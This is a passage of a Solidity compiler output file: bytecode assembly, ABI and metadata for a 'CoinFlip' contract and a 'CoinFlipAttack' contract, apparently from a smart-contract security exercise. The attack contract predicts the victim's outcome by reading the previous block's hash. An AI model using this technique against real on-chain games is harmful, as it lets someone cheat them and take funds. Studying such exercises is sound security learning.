											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1135,
											"end": 1345,
											"name": "tag",
											"source": 2,
											"value": "10"
										},
										{
											"begin": 1135,
											"end": 1345,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1222,
											"end": 1226,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1260,
											"end": 1262,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 1249,
											"end": 1258,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1245,
											"end": 1263,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1237,
											"end": 1263,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1237,
											"end": 1263,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1273,
											"end": 1338,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "55"
										},
										{
											"begin": 1335,
											"end": 1336,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1324,
											"end": 1333,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 1320,
											"end": 1337,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1311,
											"end": 1317,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 1273,
											"end": 1338,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "33"
										},
										{
											"begin": 1273,
											"end": 1338,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1273,
											"end": 1338,
											"name": "tag",
											"source": 2,
											"value": "55"
										},
										{
											"begin": 1273,
											"end": 1338,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1135,
											"end": 1345,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1135,
											"end": 1345,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1135,
											"end": 1345,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1135,
											"end": 1345,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1135,
											"end": 1345,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1351,
											"end": 1428,
											"name": "tag",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 1351,
											"end": 1428,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1388,
											"end": 1395,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1417,
											"end": 1422,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1406,
											"end": 1422,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1406,
											"end": 1422,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1351,
											"end": 1428,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1351,
											"end": 1428,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1351,
											"end": 1428,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1351,
											"end": 1428,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1434,
											"end": 1552,
											"name": "tag",
											"source": 2,
											"value": "35"
										},
										{
											"begin": 1434,
											"end": 1552,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1521,
											"end": 1545,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "58"
										},
										{
											"begin": 1539,
											"end": 1544,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1521,
											"end": 1545,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 1521,
											"end": 1545,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1521,
											"end": 1545,
											"name": "tag",
											"source": 2,
											"value": "58"
										},
										{
											"begin": 1521,
											"end": 1545,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1516,
											"end": 1519,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1509,
											"end": 1546,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 1434,
											"end": 1552,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1434,
											"end": 1552,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1434,
											"end": 1552,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1558,
											"end": 1780,
											"name": "tag",
											"source": 2,
											"value": "14"
										},
										{
											"begin": 1558,
											"end": 1780,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1651,
											"end": 1655,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1689,
											"end": 1691,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 1678,
											"end": 1687,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1674,
											"end": 1692,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1666,
											"end": 1692,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1666,
											"end": 1692,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1702,
											"end": 1773,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "60"
										},
										{
											"begin": 1770,
											"end": 1771,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1759,
											"end": 1768,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 1755,
											"end": 1772,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1746,
											"end": 1752,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 1702,
											"end": 1773,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "35"
										},
										{
											"begin": 1702,
											"end": 1773,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1702,
											"end": 1773,
											"name": "tag",
											"source": 2,
											"value": "60"
										},
										{
											"begin": 1702,
											"end": 1773,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1558,
											"end": 1780,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1558,
											"end": 1780,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1558,
											"end": 1780,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1558,
											"end": 1780,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1558,
											"end": 1780,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1786,
											"end": 1966,
											"name": "tag",
											"source": 2,
											"value": "36"
										},
										{
											"begin": 1786,
											"end": 1966,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1834,
											"end": 1911,
											"name": "PUSH",
											"source": 2,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1831,
											"end": 1832,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1824,
											"end": 1912,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 1931,
											"end": 1935,
											"name": "PUSH",
											"source": 2,
											"value": "11"
										},
										{
											"begin": 1928,
											"end": 1929,
											"name": "PUSH",
											"source": 2,
											"value": "4"
										},
										{
											"begin": 1921,
											"end": 1936,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 1955,
											"end": 1959,
											"name": "PUSH",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 1952,
											"end": 1953,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1945,
											"end": 1960,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 1972,
											"end": 2166,
											"name": "tag",
											"source": 2,
											"value": "17"
										},
										{
											"begin": 1972,
											"end": 2166,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2012,
											"end": 2016,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2032,
											"end": 2052,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "63"
										},
										{
											"begin": 2050,
											"end": 2051,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2032,
											"end": 2052,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 2032,
											"end": 2052,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2032,
											"end": 2052,
											"name": "tag",
											"source": 2,
											"value": "63"
										},
										{
											"begin": 2032,
											"end": 2052,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2027,
											"end": 2052,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2027,
											"end": 2052,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2066,
											"end": 2086,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "64"
										},
										{
											"begin": 2084,
											"end": 2085,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 2066,
											"end": 2086,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 2066,
											"end": 2086,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2066,
											"end": 2086,
											"name": "tag",
											"source": 2,
											"value": "64"
										},
										{
											"begin": 2066,
											"end": 2086,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2061,
											"end": 2086,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 2061,
											"end": 2086,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2110,
											"end": 2111,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2107,
											"end": 2108,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2103,
											"end": 2112,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 2095,
											"end": 2112,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2095,
											"end": 2112,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2134,
											"end": 2135,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2128,
											"end": 2132,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2125,
											"end": 2136,
											"name": "GT",
											"source": 2
										},
										{
											"begin": 2122,
											"end": 2159,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 2122,
											"end": 2159,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "65"
										},
										{
											"begin": 2122,
											"end": 2159,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 2139,
											"end": 2157,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "66"
										},
										{
											"begin": 2139,
											"end": 2157,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "36"
										},
										{
											"begin": 2139,
											"end": 2157,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2139,
											"end": 2157,
											"name": "tag",
											"source": 2,
											"value": "66"
										},
										{
											"begin": 2139,
											"end": 2157,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2122,
											"end": 2159,
											"name": "tag",
											"source": 2,
											"value": "65"
										},
										{
											"begin": 2122,
											"end": 2159,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1972,
											"end": 2166,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1972,
											"end": 2166,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1972,
											"end": 2166,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1972,
											"end": 2166,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1972,
											"end": 2166,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2172,
											"end": 2352,
											"name": "tag",
											"source": 2,
											"value": "37"
										},
										{
											"begin": 2172,
											"end": 2352,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2220,
											"end": 2297,
											"name": "PUSH",
											"source": 2,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 2217,
											"end": 2218,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2210,
											"end": 2298,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 2317,
											"end": 2321,
											"name": "PUSH",
											"source": 2,
											"value": "12"
										},
										{
											"begin": 2314,
											"end": 2315,
											"name": "PUSH",
											"source": 2,
											"value": "4"
										},
										{
											"begin": 2307,
											"end": 2322,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 2341,
											"end": 2345,
											"name": "PUSH",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 2338,
											"end": 2339,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2331,
											"end": 2346,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 2358,
											"end": 2543,
											"name": "tag",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 2358,
											"end": 2543,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2398,
											"end": 2399,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2415,
											"end": 2435,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "69"
										},
										{
											"begin": 2433,
											"end": 2434,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2415,
											"end": 2435,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 2415,
											"end": 2435,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2415,
											"end": 2435,
											"name": "tag",
											"source": 2,
											"value": "69"
										},
										{
											"begin": 2415,
											"end": 2435,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2410,
											"end": 2435,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2410,
											"end": 2435,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2449,
											"end": 2469,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "70"
										},
										{
											"begin": 2467,
											"end": 2468,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 2449,
											"end": 2469,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 2449,
											"end": 2469,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2449,
											"end": 2469,
											"name": "tag",
											"source": 2,
											"value": "70"
										},
										{
											"begin": 2449,
											"end": 2469,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2444,
											"end": 2469,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 2444,
											"end": 2469,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2488,
											"end": 2489,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2478,
											"end": 2513,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "71"
										},
										{
											"begin": 2478,
											"end": 2513,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 2493,
											"end": 2511,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "72"
										},
										{
											"begin": 2493,
											"end": 2511,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "37"
										},
										{
											"begin": 2493,
											"end": 2511,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2493,
											"end": 2511,
											"name": "tag",
											"source": 2,
											"value": "72"
										},
										{
											"begin": 2493,
											"end": 2511,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2478,
											"end": 2513,
											"name": "tag",
											"source": 2,
											"value": "71"
										},
										{
											"begin": 2478,
											"end": 2513,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2535,
											"end": 2536,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2532,
											"end": 2533,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2528,
											"end": 2537,
											"name": "DIV",
											"source": 2
										},
										{
											"begin": 2523,
											"end": 2537,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2523,
											"end": 2537,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2358,
											"end": 2543,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 2358,
											"end": 2543,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2358,
											"end": 2543,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2358,
											"end": 2543,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2358,
											"end": 2543,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2549,
											"end": 2782,
											"name": "tag",
											"source": 2,
											"value": "25"
										},
										{
											"begin": 2549,
											"end": 2782,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2588,
											"end": 2591,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2611,
											"end": 2635,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "74"
										},
										{
											"begin": 2629,
											"end": 2634,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2611,
											"end": 2635,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 2611,
											"end": 2635,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2611,
											"end": 2635,
											"name": "tag",
											"source": 2,
											"value": "74"
										},
										{
											"begin": 2611,
											"end": 2635,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2602,
											"end": 2635,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2602,
											"end": 2635,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2657,
											"end": 2723,
											"name": "PUSH",
											"source": 2,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2650,
											"end": 2655,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2647,
											"end": 2724,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 2644,
											"end": 2747,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "75"
										},
										{
											"begin": 2644,
											"end": 2747,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 2727,
											"end": 2745,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "76"
										},
										{
											"begin": 2727,
											"end": 2745,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "36"
										},
										{
											"begin": 2727,
											"end": 2745,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2727,
											"end": 2745,
											"name": "tag",
											"source": 2,
											"value": "76"
										},
										{
											"begin": 2727,
											"end": 2745,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2644,
											"end": 2747,
											"name": "tag",
											"source": 2,
											"value": "75"
										},
										{
											"begin": 2644,
											"end": 2747,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2774,
											"end": 2775,
											"name": "PUSH",
											"source": 2,
											"value": "1"
										},
										{
											"begin": 2767,
											"end": 2772,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2763,
											"end": 2776,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 2756,
											"end": 2776,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2756,
											"end": 2776,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2549,
											"end": 2782,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2549,
											"end": 2782,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2549,
											"end": 2782,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2549,
											"end": 2782,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										}
									]
								}
							},
							"sourceList": [
								"contracts/CoinFlip.sol",
								"contracts/CoinFlipAttack.sol",
								"#utility.yul"
							]
						},
						"methodIdentifiers": {
							"consecutiveWins()": "e6f334d7",
							"flip(bool)": "1d263f67"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.27+commit.40a35a09\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"consecutiveWins\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_guess\",\"type\":\"bool\"}],\"name\":\"flip\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/CoinFlip.sol\":\"CoinFlip\"},\"evmVersion\":\"cancun\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/CoinFlip.sol\":{\"keccak256\":\"0xde2267fe6019add64a388ed10e52a67078d341d4eb1d5be53eb539348d383940\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://1875ab2048c56bdc04b4bb14a8a7d8a8c95e51a1094b14db0122ba27d43d79f7\",\"dweb:/ipfs/Qmeoh9v1P16swMmbaaHgvW5LwthEv23tJdxxHZLV8bxtyd\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 3,
								"contract": "contracts/CoinFlip.sol:CoinFlip",
								"label": "consecutiveWins",
								"offset": 0,
								"slot": "0",
								"type": "t_uint256"
							},
							{
								"astId": 5,
								"contract": "contracts/CoinFlip.sol:CoinFlip",
								"label": "lastHash",
								"offset": 0,
								"slot": "1",
								"type": "t_uint256"
							},
							{
								"astId": 8,
								"contract": "contracts/CoinFlip.sol:CoinFlip",
								"label": "FACTOR",
								"offset": 0,
								"slot": "2",
								"type": "t_uint256"
							}
						],
						"types": {
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			},
			"contracts/CoinFlipAttack.sol": {
				"CoinFlipAttack": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_victimContract",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "flipAttack",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "victimContract",
							"outputs": [
								{
									"internalType": "contract CoinFlip",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/CoinFlipAttack.sol\":91:604  contract CoinFlipAttack {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/CoinFlipAttack.sol\":175:252  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x8000000000000000000000000000000000000000000000000000000000000000\n    /* \"contracts/CoinFlipAttack.sol\":158:252  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x01\n  sstore\n    /* \"contracts/CoinFlipAttack.sol\":259:355  constructor(address _victimContract) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contracts/CoinFlipAttack.sol\":332:347  _victimContract */\n  dup1\n    /* \"contracts/CoinFlipAttack.sol\":306:320  victimContract */\n  0x00\n  0x00\n    /* \"contracts/CoinFlipAttack.sol\":306:348  victimContract = CoinFlip(_victimContract) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/CoinFlipAttack.sol\":259:355  constructor(address _victimContract) {... */\n  pop\n    /* \"contracts/CoinFlipAttack.sol\":91:604  contract CoinFlipAttack {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  0x00\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  0x00\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"contracts/CoinFlipAttack.sol\":91:604  contract CoinFlipAttack {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/CoinFlipAttack.sol\":91:604  contract CoinFlipAttack {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      revert(0x00, 0x00)\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x987a4e26\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xf32d251d\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"contracts/CoinFlipAttack.sol\":365:602  function flipAttack() public {... */\n    tag_3:\n      tag_5\n      tag_6\n      jump\t// in\n    tag_5:\n      stop\n        /* \"contracts/CoinFlipAttack.sol\":121:152  CoinFlip public  victimContract */\n    tag_4:\n      tag_7\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/CoinFlipAttack.sol\":365:602  function flipAttack() public {... */\n    tag_6:\n        /* \"contracts/CoinFlipAttack.sol\":404:422  uint256 blockValue */\n      0x00\n        /* \"contracts/CoinFlipAttack.sol\":458:459  1 */\n      0x01\n        /* \"contracts/CoinFlipAttack.sol\":443:455  block.number */\n      number\n        /* \"contracts/CoinFlipAttack.sol\":443:459  block.number - 1 */\n      tag_12\n      swap2\n      swap1\n      tag_13\n      jump\t// in\n    tag_12:\n        /* \"contracts/CoinFlipAttack.sol\":433:460  blockhash(block.number - 1) */\n      blockhash\n        /* 